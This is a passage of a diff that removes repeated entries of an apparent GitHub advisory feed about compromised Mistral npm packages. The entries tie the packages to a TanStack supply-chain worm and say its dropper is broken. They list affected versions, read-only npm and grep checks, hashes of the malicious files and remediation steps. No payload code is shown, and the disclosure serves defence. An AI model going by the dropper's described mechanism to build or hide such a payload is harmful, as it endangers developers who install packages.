-<li><code>execFileSync</code> throws <code>ENOENT</code> and the tmpdir is wiped before payload runs. Bun gets downloaded to a tmpdir but no payload execution.</li>
-</ul>
-</li>
-</ul>
-<p>We still recommend removing the packages, see below for remediation.</p>
-<h2 id="check-whether-you-are-affected">Check whether you are affected</h2>
-<p>You are affected if one of the package versions above was installed in any environment <strong>during the exposure window</strong> or is present in a lockfile, build artifact, container image, package cache, or deployment image.</p>
-<table>
-<thead>
-<tr>
-<th>Package</th>
-<th>Affected versions</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>@mistralai/mistralai</code></td>
-<td><code>2.2.2</code>, <code>2.2.3</code>, <code>2.2.4</code></td>
-</tr>
-<tr>
-<td><code>@mistralai/mistralai-azure</code></td>
-<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
-</tr>
-<tr>
-<td><code>@mistralai/mistralai-gcp</code></td>
-<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
-</tr>
-</tbody></table>
-<p>Check installed versions:</p>
-<pre><code class="language-bash">npm ls @mistralai/mistralai @mistralai/mistralai-azure @mistralai/mistralai-gcp
-grep -n -A 4 -B 2 -E '@mistralai/(mistralai|mistralai-azure|mistralai-gcp)|2\.2\.[2-4]|1\.7\.[1-3]' \
-  package-lock.json pnpm-lock.yaml yarn.lock 2&gt;/dev/null
-</code></pre>
-<p>Look for any of the following files</p>
-<ul>
-<li><code>router_init.js</code> (embedded in all @tanstack packages): <code>ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c</code></li>
-<li><code>tanstack_runner.js</code> (from git commit): <code>2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96</code></li>
-<li><code>@tanstack/setup</code> package.json: <code>7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b</code></li>
-</ul>
-<p>You may also run this (read-only) <a href="https://gist.github.com/beowolx2/a3ceeb18d1f1cec977d5cc6eaf41c96a">script</a> that will automatically flag known malicious files.</p>
-<p>You are not affected by this advisory if you did not install the affected package versions and they are not present in your lockfiles, build caches, deployment artifacts, or package mirrors.</p>
-<p>If the command finds an affected version, continue with the <a href="#remediate-affected-systems">remediation steps below</a>. If you use private package mirrors, caches, or container base images, check those copies too.</p>
-<h2 id="remediate-affected-systems">Remediate affected systems</h2>
-<ol>
-<li>Stop using the affected package version immediately.</li>
-<li>Clean systems where one of this package has been installed.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
-<li><a href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-18T17:55:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@mistralai/mistralai-gcp] Broken dropper in @mistralai/mistralai, @mistralai/mistralai-azure, @mistralai/mistralai-gcp]]></title>
-        <id>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</id>
-        <link href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7"/>
-        <updated>2026-05-18T17:55:55.000Z</updated>
-        <content type="html"><![CDATA[<p>Mistral npm <code>@mistralai/mistralai</code>, <code>@mistralai/mistralai-azure</code>, <code>@mistralai/mistralai-gcp</code> were compromised by a supply chain attack related to the <a href="https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx">TanStack security incident</a>. An automated worm associated with the attack led to <strong>compromised npm package versions being published</strong>.</p>
-<p>Current investigation indicates that an affected developer device was involved. We have no indication that Mistral infrastructure was compromised. The compromised versions were removed from npm. They were available only between May 11 at 22:45 UTC and May 12 at 01:53 UTC. <strong>Previous and later versions are not affected by this advisory</strong>.</p>
-<h2 id="impact">Impact</h2>
-<p>The dropper <strong>is broken</strong>, it has no impact. </p>
-<ul>
-<li><code>setup.mjs</code> references <code>tanstack_runner.js</code> but the payload file is named <code>router_init.js</code><ul>
-<li><code>execFileSync</code> throws <code>ENOENT</code> and the tmpdir is wiped before payload runs. Bun gets downloaded to a tmpdir but no payload execution.</li>
-</ul>
-</li>
-</ul>
-<p>We still recommend removing the packages, see below for remediation.</p>
-<h2 id="check-whether-you-are-affected">Check whether you are affected</h2>
-<p>You are affected if one of the package versions above was installed in any environment <strong>during the exposure window</strong> or is present in a lockfile, build artifact, container image, package cache, or deployment image.</p>
-<table>
-<thead>
-<tr>
-<th>Package</th>
-<th>Affected versions</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>@mistralai/mistralai</code></td>
-<td><code>2.2.2</code>, <code>2.2.3</code>, <code>2.2.4</code></td>
-</tr>
-<tr>
-<td><code>@mistralai/mistralai-azure</code></td>
-<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
-</tr>
-<tr>
-<td><code>@mistralai/mistralai-gcp</code></td>
-<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
-</tr>
-</tbody></table>
-<p>Check installed versions:</p>
-<pre><code class="language-bash">npm ls @mistralai/mistralai @mistralai/mistralai-azure @mistralai/mistralai-gcp
-grep -n -A 4 -B 2 -E '@mistralai/(mistralai|mistralai-azure|mistralai-gcp)|2\.2\.[2-4]|1\.7\.[1-3]' \
-  package-lock.json pnpm-lock.yaml yarn.lock 2&gt;/dev/null
-</code></pre>
-<p>Look for any of the following files</p>
-<ul>
-<li><code>router_init.js</code> (embedded in all @tanstack packages): <code>ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c</code></li>
-<li><code>tanstack_runner.js</code> (from git commit): <code>2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96</code></li>
-<li><code>@tanstack/setup</code> package.json: <code>7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b</code></li>
-</ul>
-<p>You may also run this (read-only) <a href="https://gist.github.com/beowolx2/a3ceeb18d1f1cec977d5cc6eaf41c96a">script</a> that will automatically flag known malicious files.</p>
-<p>You are not affected by this advisory if you did not install the affected package versions and they are not present in your lockfiles, build caches, deployment artifacts, or package mirrors.</p>
-<p>If the command finds an affected version, continue with the <a href="#remediate-affected-systems">remediation steps below</a>. If you use private package mirrors, caches, or container base images, check those copies too.</p>
-<h2 id="remediate-affected-systems">Remediate affected systems</h2>
-<ol>
-<li>Stop using the affected package version immediately.</li>
-<li>Clean systems where one of this package has been installed.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
-<li><a href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-18T17:55:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@mistralai/mistralai-azure] Broken dropper in @mistralai/mistralai, @mistralai/mistralai-azure, @mistralai/mistralai-gcp]]></title>
-        <id>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</id>
-        <link href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7"/>
-        <updated>2026-05-18T17:55:55.000Z</updated>
-        <content type="html"><![CDATA[<p>Mistral npm <code>@mistralai/mistralai</code>, <code>@mistralai/mistralai-azure</code>, <code>@mistralai/mistralai-gcp</code> were compromised by a supply chain attack related to the <a href="https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx">TanStack security incident</a>. An automated worm associated with the attack led to <strong>compromised npm package versions being published</strong>.</p>
-<p>Current investigation indicates that an affected developer device was involved. We have no indication that Mistral infrastructure was compromised. The compromised versions were removed from npm. They were available only between May 11 at 22:45 UTC and May 12 at 01:53 UTC. <strong>Previous and later versions are not affected by this advisory</strong>.</p>
-<h2 id="impact">Impact</h2>
-<p>The dropper <strong>is broken</strong>, it has no impact. </p>
-<ul>
-<li><code>setup.mjs</code> references <code>tanstack_runner.js</code> but the payload file is named <code>router_init.js</code><ul>
-<li><code>execFileSync</code> throws <code>ENOENT</code> and the tmpdir is wiped before payload runs. Bun gets downloaded to a tmpdir but no payload execution.</li>
-</ul>
-</li>
-</ul>
-<p>We still recommend removing the packages, see below for remediation.</p>
-<h2 id="check-whether-you-are-affected">Check whether you are affected</h2>
-<p>You are affected if one of the package versions above was installed in any environment <strong>during the exposure window</strong> or is present in a lockfile, build artifact, container image, package cache, or deployment image.</p>
-<table>
-<thead>
-<tr>
-<th>Package</th>
-<th>Affected versions</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>@mistralai/mistralai</code></td>
-<td><code>2.2.2</code>, <code>2.2.3</code>, <code>2.2.4</code></td>
-</tr>
-<tr>
-<td><code>@mistralai/mistralai-azure</code></td>
-<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
-</tr>
-<tr>
-<td><code>@mistralai/mistralai-gcp</code></td>
-<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
-</tr>
-</tbody></table>
-<p>Check installed versions:</p>
-<pre><code class="language-bash">npm ls @mistralai/mistralai @mistralai/mistralai-azure @mistralai/mistralai-gcp
-grep -n -A 4 -B 2 -E '@mistralai/(mistralai|mistralai-azure|mistralai-gcp)|2\.2\.[2-4]|1\.7\.[1-3]' \
-  package-lock.json pnpm-lock.yaml yarn.lock 2&gt;/dev/null
-</code></pre>
-<p>Look for any of the following files</p>
-<ul>
-<li><code>router_init.js</code> (embedded in all @tanstack packages): <code>ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c</code></li>
-<li><code>tanstack_runner.js</code> (from git commit): <code>2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96</code></li>
-<li><code>@tanstack/setup</code> package.json: <code>7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b</code></li>
-</ul>
-<p>You may also run this (read-only) <a href="https://gist.github.com/beowolx2/a3ceeb18d1f1cec977d5cc6eaf41c96a">script</a> that will automatically flag known malicious files.</p>
-<p>You are not affected by this advisory if you did not install the affected package versions and they are not present in your lockfiles, build caches, deployment artifacts, or package mirrors.</p>
-<p>If the command finds an affected version, continue with the <a href="#remediate-affected-systems">remediation steps below</a>. If you use private package mirrors, caches, or container base images, check those copies too.</p>
-<h2 id="remediate-affected-systems">Remediate affected systems</h2>
-<ol>
-<li>Stop using the affected package version immediately.</li>
-<li>Clean systems where one of this package has been installed.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
-<li><a href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-18T17:55:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@mistralai/mistralai-azure] Broken dropper in @mistralai/mistralai, @mistralai/mistralai-azure, @mistralai/mistralai-gcp]]></title>
-        <id>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</id>
-        <link href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7"/>
-        <updated>2026-05-18T17:55:55.000Z</updated>
-        <content type="html"><![CDATA[<p>Mistral npm <code>@mistralai/mistralai</code>, <code>@mistralai/mistralai-azure</code>, <code>@mistralai/mistralai-gcp</code> were compromised by a supply chain attack related to the <a href="https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx">TanStack security incident</a>. An automated worm associated with the attack led to <strong>compromised npm package versions being published</strong>.</p>
-<p>Current investigation indicates that an affected developer device was involved. We have no indication that Mistral infrastructure was compromised. The compromised versions were removed from npm. They were available only between May 11 at 22:45 UTC and May 12 at 01:53 UTC. <strong>Previous and later versions are not affected by this advisory</strong>.</p>
-<h2 id="impact">Impact</h2>
-<p>The dropper <strong>is broken</strong>, it has no impact. </p>
-<ul>
-<li><code>setup.mjs</code> references <code>tanstack_runner.js</code> but the payload file is named <code>router_init.js</code><ul>
-<li><code>execFileSync</code> throws <code>ENOENT</code> and the tmpdir is wiped before payload runs. Bun gets downloaded to a tmpdir but no payload execution.</li>
-</ul>
-</li>
-</ul>
-<p>We still recommend removing the packages, see below for remediation.</p>
-<h2 id="check-whether-you-are-affected">Check whether you are affected</h2>
-<p>You are affected if one of the package versions above was installed in any environment <strong>during the exposure window</strong> or is present in a lockfile, build artifact, container image, package cache, or deployment image.</p>
-<table>
-<thead>
-<tr>
-<th>Package</th>
-<th>Affected versions</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>@mistralai/mistralai</code></td>
-<td><code>2.2.2</code>, <code>2.2.3</code>, <code>2.2.4</code></td>
-</tr>
-<tr>
-<td><code>@mistralai/mistralai-azure</code></td>
-<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
-</tr>
-<tr>
-<td><code>@mistralai/mistralai-gcp</code></td>
-<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
-</tr>
-</tbody></table>
-<p>Check installed versions:</p>
-<pre><code class="language-bash">npm ls @mistralai/mistralai @mistralai/mistralai-azure @mistralai/mistralai-gcp
-grep -n -A 4 -B 2 -E '@mistralai/(mistralai|mistralai-azure|mistralai-gcp)|2\.2\.[2-4]|1\.7\.[1-3]' \
-  package-lock.json pnpm-lock.yaml yarn.lock 2&gt;/dev/null
-</code></pre>
-<p>Look for any of the following files</p>
-<ul>
-<li><code>router_init.js</code> (embedded in all @tanstack packages): <code>ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c</code></li>
-<li><code>tanstack_runner.js</code> (from git commit): <code>2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96</code></li>
-<li><code>@tanstack/setup</code> package.json: <code>7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b</code></li>
-</ul>
-<p>You may also run this (read-only) <a href="https://gist.github.com/beowolx2/a3ceeb18d1f1cec977d5cc6eaf41c96a">script</a> that will automatically flag known malicious files.</p>
-<p>You are not affected by this advisory if you did not install the affected package versions and they are not present in your lockfiles, build caches, deployment artifacts, or package mirrors.</p>
-<p>If the command finds an affected version, continue with the <a href="#remediate-affected-systems">remediation steps below</a>. If you use private package mirrors, caches, or container base images, check those copies too.</p>
-<h2 id="remediate-affected-systems">Remediate affected systems</h2>
-<ol>
-<li>Stop using the affected package version immediately.</li>
-<li>Clean systems where one of this package has been installed.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
-<li><a href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-18T17:55:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@mistralai/mistralai] Broken dropper in @mistralai/mistralai, @mistralai/mistralai-azure, @mistralai/mistralai-gcp]]></title>
-        <id>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</id>
-        <link href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7"/>
-        <updated>2026-05-18T17:55:55.000Z</updated>
-        <content type="html"><![CDATA[<p>Mistral npm <code>@mistralai/mistralai</code>, <code>@mistralai/mistralai-azure</code>, <code>@mistralai/mistralai-gcp</code> were compromised by a supply chain attack related to the <a href="https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx">TanStack security incident</a>. An automated worm associated with the attack led to <strong>compromised npm package versions being published</strong>.</p>
-<p>Current investigation indicates that an affected developer device was involved. We have no indication that Mistral infrastructure was compromised. The compromised versions were removed from npm. They were available only between May 11 at 22:45 UTC and May 12 at 01:53 UTC. <strong>Previous and later versions are not affected by this advisory</strong>.</p>
-<h2 id="impact">Impact</h2>
-<p>The dropper <strong>is broken</strong>, it has no impact. </p>
-<ul>
-<li><code>setup.mjs</code> references <code>tanstack_runner.js</code> but the payload file is named <code>router_init.js</code><ul>
-<li><code>execFileSync</code> throws <code>ENOENT</code> and the tmpdir is wiped before payload runs. Bun gets downloaded to a tmpdir but no payload execution.</li>
-</ul>
-</li>
-</ul>
-<p>We still recommend removing the packages, see below for remediation.</p>
-<h2 id="check-whether-you-are-affected">Check whether you are affected</h2>
-<p>You are affected if one of the package versions above was installed in any environment <strong>during the exposure window</strong> or is present in a lockfile, build artifact, container image, package cache, or deployment image.</p>
-<table>
-<thead>
-<tr>
-<th>Package</th>
-<th>Affected versions</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>@mistralai/mistralai</code></td>
-<td><code>2.2.2</code>, <code>2.2.3</code>, <code>2.2.4</code></td>
-</tr>
-<tr>
-<td><code>@mistralai/mistralai-azure</code></td>
-<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
-</tr>
-<tr>
-<td><code>@mistralai/mistralai-gcp</code></td>
-<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
-</tr>
-</tbody></table>
-<p>Check installed versions:</p>
-<pre><code class="language-bash">npm ls @mistralai/mistralai @mistralai/mistralai-azure @mistralai/mistralai-gcp
-grep -n -A 4 -B 2 -E '@mistralai/(mistralai|mistralai-azure|mistralai-gcp)|2\.2\.[2-4]|1\.7\.[1-3]' \
-  package-lock.json pnpm-lock.yaml yarn.lock 2&gt;/dev/null
-</code></pre>
-<p>Look for any of the following files</p>
-<ul>
-<li><code>router_init.js</code> (embedded in all @tanstack packages): <code>ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c</code></li>
-<li><code>tanstack_runner.js</code> (from git commit): <code>2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96</code></li>
-<li><code>@tanstack/setup</code> package.json: <code>7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b</code></li>
-</ul>
-<p>You may also run this (read-only) <a href="https://gist.github.com/beowolx2/a3ceeb18d1f1cec977d5cc6eaf41c96a">script</a> that will automatically flag known malicious files.</p>
-<p>You are not affected by this advisory if you did not install the affected package versions and they are not present in your lockfiles, build caches, deployment artifacts, or package mirrors.</p>
-<p>If the command finds an affected version, continue with the <a href="#remediate-affected-systems">remediation steps below</a>. If you use private package mirrors, caches, or container base images, check those copies too.</p>
-<h2 id="remediate-affected-systems">Remediate affected systems</h2>
-<ol>
-<li>Stop using the affected package version immediately.</li>
-<li>Clean systems where one of this package has been installed.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
-<li><a href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-18T17:55:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@mistralai/mistralai] Broken dropper in @mistralai/mistralai, @mistralai/mistralai-azure, @mistralai/mistralai-gcp]]></title>
-        <id>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</id>
-        <link href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7"/>
-        <updated>2026-05-18T17:55:55.000Z</updated>
-        <content type="html"><![CDATA[<p>Mistral npm <code>@mistralai/mistralai</code>, <code>@mistralai/mistralai-azure</code>, <code>@mistralai/mistralai-gcp</code> were compromised by a supply chain attack related to the <a href="https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx">TanStack security incident</a>. An automated worm associated with the attack led to <strong>compromised npm package versions being published</strong>.</p>
-<p>Current investigation indicates that an affected developer device was involved. We have no indication that Mistral infrastructure was compromised. The compromised versions were removed from npm. They were available only between May 11 at 22:45 UTC and May 12 at 01:53 UTC. <strong>Previous and later versions are not affected by this advisory</strong>.</p>
-<h2 id="impact">Impact</h2>
-<p>The dropper <strong>is broken</strong>, it has no impact. </p>
-<ul>
-<li><code>setup.mjs</code> references <code>tanstack_runner.js</code> but the payload file is named <code>router_init.js</code><ul>
-<li><code>execFileSync</code> throws <code>ENOENT</code> and the tmpdir is wiped before payload runs. Bun gets downloaded to a tmpdir but no payload execution.</li>
-</ul>
-</li>
-</ul>
-<p>We still recommend removing the packages, see below for remediation.</p>
-<h2 id="check-whether-you-are-affected">Check whether you are affected</h2>
-<p>You are affected if one of the package versions above was installed in any environment <strong>during the exposure window</strong> or is present in a lockfile, build artifact, container image, package cache, or deployment image.</p>
-<table>
-<thead>
-<tr>
-<th>Package</th>
-<th>Affected versions</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>@mistralai/mistralai</code></td>
-<td><code>2.2.2</code>, <code>2.2.3</code>, <code>2.2.4</code></td>
-</tr>
-<tr>
-<td><code>@mistralai/mistralai-azure</code></td>
-<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
-</tr>
-<tr>
-<td><code>@mistralai/mistralai-gcp</code></td>
-<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
-</tr>
-</tbody></table>
-<p>Check installed versions:</p>
-<pre><code class="language-bash">npm ls @mistralai/mistralai @mistralai/mistralai-azure @mistralai/mistralai-gcp
-grep -n -A 4 -B 2 -E '@mistralai/(mistralai|mistralai-azure|mistralai-gcp)|2\.2\.[2-4]|1\.7\.[1-3]' \
-  package-lock.json pnpm-lock.yaml yarn.lock 2&gt;/dev/null
-</code></pre>
-<p>Look for any of the following files</p>
-<ul>
-<li><code>router_init.js</code> (embedded in all @tanstack packages): <code>ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c</code></li>
-<li><code>tanstack_runner.js</code> (from git commit): <code>2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96</code></li>
-<li><code>@tanstack/setup</code> package.json: <code>7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b</code></li>
-</ul>
-<p>You may also run this (read-only) <a href="https://gist.github.com/beowolx2/a3ceeb18d1f1cec977d5cc6eaf41c96a">script</a> that will automatically flag known malicious files.</p>
-<p>You are not affected by this advisory if you did not install the affected package versions and they are not present in your lockfiles, build caches, deployment artifacts, or package mirrors.</p>
-<p>If the command finds an affected version, continue with the <a href="#remediate-affected-systems">remediation steps below</a>. If you use private package mirrors, caches, or container base images, check those copies too.</p>
-<h2 id="remediate-affected-systems">Remediate affected systems</h2>
-<ol>
-<li>Stop using the affected package version immediately.</li>
-<li>Clean systems where one of this package has been installed.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
-<li><a href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-18T17:55:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@mistralai/mistralai-gcp] Broken dropper in @mistralai/mistralai, @mistralai/mistralai-azure, @mistralai/mistralai-gcp]]></title>
-        <id>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</id>
-        <link href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7"/>
-        <updated>2026-05-18T17:55:55.000Z</updated>
-        <content type="html"><![CDATA[<p>Mistral npm <code>@mistralai/mistralai</code>, <code>@mistralai/mistralai-azure</code>, <code>@mistralai/mistralai-gcp</code> were compromised by a supply chain attack related to the <a href="https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx">TanStack security incident</a>. An automated worm associated with the attack led to <strong>compromised npm package versions being published</strong>.</p>
-<p>Current investigation indicates that an affected developer device was involved. We have no indication that Mistral infrastructure was compromised. The compromised versions were removed from npm. They were available only between May 11 at 22:45 UTC and May 12 at 01:53 UTC. <strong>Previous and later versions are not affected by this advisory</strong>.</p>
-<h2 id="impact">Impact</h2>
-<p>The dropper <strong>is broken</strong>, it has no impact. </p>
-<ul>
-<li><code>setup.mjs</code> references <code>tanstack_runner.js</code> but the payload file is named <code>router_init.js</code><ul>
-<li><code>execFileSync</code> throws <code>ENOENT</code> and the tmpdir is wiped before payload runs. Bun gets downloaded to a tmpdir but no payload execution.</li>
-</ul>
-</li>
-</ul>
-<p>We still recommend removing the packages, see below for remediation.</p>
-<h2 id="check-whether-you-are-affected">Check whether you are affected</h2>
-<p>You are affected if one of the package versions above was installed in any environment <strong>during the exposure window</strong> or is present in a lockfile, build artifact, container image, package cache, or deployment image.</p>
-<table>
-<thead>
-<tr>
-<th>Package</th>
-<th>Affected versions</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>@mistralai/mistralai</code></td>
-<td><code>2.2.2</code>, <code>2.2.3</code>, <code>2.2.4</code></td>
-</tr>
-<tr>
-<td><code>@mistralai/mistralai-azure</code></td>
-<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
-</tr>
-<tr>
-<td><code>@mistralai/mistralai-gcp</code></td>
-<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
-</tr>
-</tbody></table>
-<p>Check installed versions:</p>
-<pre><code class="language-bash">npm ls @mistralai/mistralai @mistralai/mistralai-azure @mistralai/mistralai-gcp
-grep -n -A 4 -B 2 -E '@mistralai/(mistralai|mistralai-azure|mistralai-gcp)|2\.2\.[2-4]|1\.7\.[1-3]' \
-  package-lock.json pnpm-lock.yaml yarn.lock 2&gt;/dev/null
-</code></pre>
-<p>Look for any of the following files</p>
-<ul>
-<li><code>router_init.js</code> (embedded in all @tanstack packages): <code>ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c</code></li>
-<li><code>tanstack_runner.js</code> (from git commit): <code>2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96</code></li>
-<li><code>@tanstack/setup</code> package.json: <code>7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b</code></li>
-</ul>
-<p>You may also run this (read-only) <a href="https://gist.github.com/beowolx2/a3ceeb18d1f1cec977d5cc6eaf41c96a">script</a> that will automatically flag known malicious files.</p>
-<p>You are not affected by this advisory if you did not install the affected package versions and they are not present in your lockfiles, build caches, deployment artifacts, or package mirrors.</p>
-<p>If the command finds an affected version, continue with the <a href="#remediate-affected-systems">remediation steps below</a>. If you use private package mirrors, caches, or container base images, check those copies too.</p>
-<h2 id="remediate-affected-systems">Remediate affected systems</h2>
-<ol>
-<li>Stop using the affected package version immediately.</li>
-<li>Clean systems where one of this package has been installed.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
-<li><a href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-18T17:55:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@mistralai/mistralai-azure] Broken dropper in @mistralai/mistralai, @mistralai/mistralai-azure, @mistralai/mistralai-gcp]]></title>
-        <id>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</id>
-        <link href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7"/>
-        <updated>2026-05-18T17:55:55.000Z</updated>
